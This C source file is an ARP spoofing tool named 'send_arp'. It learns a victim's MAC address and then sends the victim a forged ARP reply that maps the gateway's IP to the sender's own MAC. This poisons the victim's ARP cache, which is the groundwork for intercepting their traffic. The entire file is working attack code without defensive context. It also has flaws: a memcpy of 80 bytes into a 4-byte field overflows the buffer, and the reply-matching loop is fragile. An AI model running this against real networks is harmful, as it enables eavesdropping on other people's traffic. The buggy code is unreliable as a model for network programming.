#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>

#define ETHER_ADDR_LEN  6
#define SIZE_ETHERNET 14
typedef struct sniff_ethernet {
        u_char ether_dhost[ETHER_ADDR_LEN];     /* Destination host address */
        u_char ether_shost[ETHER_ADDR_LEN];     /* Source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
} sniff_ethernet;

//reference http://minirighi.sourceforge.net/html/arp_8h-source.html 
//but, ip and mac type change uintn_t to u_char for memcpy,inet_pton
typedef struct sniff_arp {
	uint16_t arp_hard_type;
	uint16_t arp_proto_type;
	uint8_t  arp_hard_size;
	uint8_t  arp_proto_size;
	uint16_t arp_op;
	u_char  arp_eth_source[6];
	u_char arp_ip_source[4];
	u_char  arp_eth_dest[6];
	u_char arp_ip_dest[4];
} sniff_arp;

char usage[]={"usage: send_arp <interface> <sender ip> <target ip>\n"};

int main(int argc,char** argv){

	if(argc != 4){ 
		printf("%s",usage); 
		return 1;
	}

	char* dev = argv[1];
	char* sender_ip = argv[2]; //victim
	char* target_ip = argv[3]; //gateway
	char errbuf[PCAP_ERRBUF_SIZE];
	
	struct sniff_arp arp;
	struct sniff_ethernet eth;
	
	struct ifreq ifr;

	int soc = socket(AF_INET,SOCK_STREAM,0); // ipv4, tcp, ip
	if (soc == -1) { printf("ERROR"); return 1;}
	ifr.ifr_addr.sa_family = AF_INET;
	strcpy(ifr.ifr_name,dev);
	
	u_char mac_address[6];
	ioctl(soc, SIOCGIFHWADDR, &ifr);
	memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
	//printf("ether_shost [%02X:%02X:%02X:%02X:%02X:%02X]\n",mac_address[0],mac_address[1],mac_address[2],mac_address[3],mac_address[4],mac_address[5]);
	memcpy(arp.arp_eth_source,mac_address,6);
	memcpy(eth.ether_shost,mac_address,6);

	ioctl(soc,SIOCGIFADDR,&ifr);
	struct in_addr ip_addr = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
	//printf("%s",inet_ntoa(ip_addr));
	memcpy(arp.arp_ip_source,&ip_addr.s_addr,80);
	close(soc);	
	
	memcpy(eth.ether_dhost,"\xff\xff\xff\xff\xff\xff",6);
	memcpy(arp.arp_eth_dest,"\x00\x00\x00\x00\x00\x00",6);
	

	//printf("%u",arp.arp_eth_dest);
	eth.ether_type = htons(0x0806);
	arp.arp_hard_type=ntohs(0x0001);
	arp.arp_hard_size=0x06;
	arp.arp_proto_type=ntohs(0x0800);
	arp.arp_proto_size=0x04;
	arp.arp_op=ntohs(0x0001); //request

	inet_pton(AF_INET,sender_ip,&arp.arp_ip_dest);

	u_char* req_packet = (u_char *) malloc(sizeof(char)*42);;
	memcpy(req_packet,&eth,sizeof(struct sniff_ethernet));
	memcpy(req_packet+sizeof(struct sniff_ethernet),&arp,sizeof(struct sniff_arp));

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  	if (handle == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    		return -1;
  	}
	if(pcap_sendpacket(handle,req_packet,42)!= 0)
	{
		fprintf(stderr,"send error: %s\n",pcap_geterr(handle));
		return -1;
	}
	
		
	u_char sender_mac[6];
	int findmac = 0;
	while (1) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle,&header,&packet);
		if(res == 0) continue;
		if(res == -1 || res == -2 ) break;
	
		struct sniff_ethernet* res_eth = (struct sniff_ethernet*)(packet);
		//printf("test ether type: %x\n", ntohs(res_eth->ether_type));
		if(ntohs(res_eth->ether_type) == 0x0806 )
		{
			struct sniff_arp* res_arp = (struct sniff_arp*)(packet+14);
    			//printf("%x%x%x%x",res_arp->arp_ip_dest[3],res_arp->arp_ip_dest[2],res_arp->arp_ip_dest[1],res_arp->arp_ip_dest[0]);
			//printf("%x%x%x%x",arp.arp_ip_source[3],arp.arp_ip_source[2],arp.arp_ip_source[1],arp.arp_ip_source[0]);
			for(int i=0;i<4;i++)
			{
				if(res_arp->arp_ip_dest[i] != arp.arp_ip_source[i])
				{
					printf("error not match");
					findmac+=1;
					break;
				}
			}
			if(findmac==0)
			{
				for(int i=0;i < 6;i++){	
					sender_mac[i] = res_eth->ether_shost[i];
				};
			}
	
		}
		break;
	}
		
	//printf("ether_shost [%02X:%02X:%02X:%02X:%02X:%02X]\n",sender_mac[0],sender_mac[1],sender_mac[2],sender_mac[3],sender_mac[4],sender_mac[5]);
	memcpy(eth.ether_dhost,sender_mac,6);	
	arp.arp_op = ntohs(0x0002); // reply
	memcpy(arp.arp_eth_dest,sender_mac,6);
	inet_pton(AF_INET,target_ip,&arp.arp_ip_source);

	u_char* res_packet = (u_char *) malloc(sizeof(char)*42);;   
	memcpy(res_packet,&eth,sizeof(struct sniff_ethernet));
	memcpy(res_packet+sizeof(struct sniff_ethernet),&arp,sizeof(struct sniff_arp));

	if(pcap_sendpacket(handle, res_packet,42)!=0)
	{
		fprintf(stderr,"send error: %s\n",pcap_geterr(handle));
		return -1;
	}
	pcap_close(handle);
	return 0;
}
